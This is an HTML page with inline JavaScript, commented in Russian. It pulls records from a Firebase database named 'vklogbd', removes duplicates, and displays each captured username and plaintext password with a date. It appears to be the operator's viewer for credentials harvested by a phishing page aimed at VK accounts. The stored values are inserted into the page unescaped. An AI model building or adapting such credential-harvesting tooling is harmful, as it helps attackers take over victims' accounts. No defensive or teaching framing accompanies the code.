<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>document</title>

    <style>
      html{box-sizing:border-box}*,::after,::before{box-sizing:inherit}body{background-color:#191919;color:#fff;font-family:sans-serif}ul{max-width:760px;padding:40px 20px;margin:0 auto;list-style:none}li{width:100%;margin:0;border-radius:10px;border:1px solid #000;padding:35px 20px 10px;font-size:24px;background-color:#131212;position:relative}li:not(:last-child){margin-bottom:15px}.log>span{color:#01a29a}.pass>span{color:#b00020}.text{color:#ccc!important;padding-left:5px;word-wrap:break-word}.date{position:absolute;right:15px;top:15px;font-size:18px;color:#ccc}  
    </style>
  </head>
  <body>
    <ul>

    </ul>



    <script>
      'use strict';

      const ul = document.querySelector('ul');
      let arr = [];

      const request = async (url) => {
        const response = await fetch(url, { method: 'GET'});
        if (!response.ok) { throw new Error(`Could not fetch ${url}, status: ${response.status}`);}
        return await response.json();
      };

      request('https://vklogbd-default-rtdb.firebaseio.com/log.json')
        .then((res) => {
          Object.values(res).forEach((obj) => {
            arr.push(obj);
          });
        }).then(q => {
            const result = [];
            const duplicatesIndices = [];

            // Перебираем каждый элемент в исходном массиве
            arr.forEach((current, index) => {
              if (duplicatesIndices.includes(index)) return;

              result.push(current);

              // Сравниваем каждый элемент в массиве после текущего
              for (let comparisonIndex = index + 1; comparisonIndex < arr.length; comparisonIndex++) {
                const comparison = arr[comparisonIndex];
                const currentKeys = Object.keys(current);
                const comparisonKeys = Object.keys(comparison);

                // Проверяем длину массивов
                if (currentKeys.length !== comparisonKeys.length) continue;

                // Проверяем значение ключей
                const currentKeysString = currentKeys.sort().join('').toLowerCase();
                const comparisonKeysString = comparisonKeys.sort().join('').toLowerCase();
                if (currentKeysString !== comparisonKeysString) continue;

                // Проверяем индексы ключей
                let valuesEqual = true;
                for (let i = 0; i < currentKeys.length; i++) {
                  const key = currentKeys[i];
                  if (current[key] !== comparison[key]) {
                    valuesEqual = false;
                    break;
                  }
                }
                if (valuesEqual) duplicatesIndices.push(comparisonIndex);
              }
            });

            result.forEach(({username, password, date}) => {
              const elem = document.createElement('li');
              elem.innerHTML = `
                <span class="date">${date}</span>
                <div class="log"><span>login:</span> <span class="text">${username}</span></div>  
                <div class="pass"><span>pass:</span> <span class="text">${password}</span></div>
              `;
              ul.prepend(elem);
            })
        }).catch(err => {
          ul.innerHTML = `
            <span style='color: red'>ошибка запроса</span> 
            ${err}
          `
        })
    </script>
  </body>
</html>
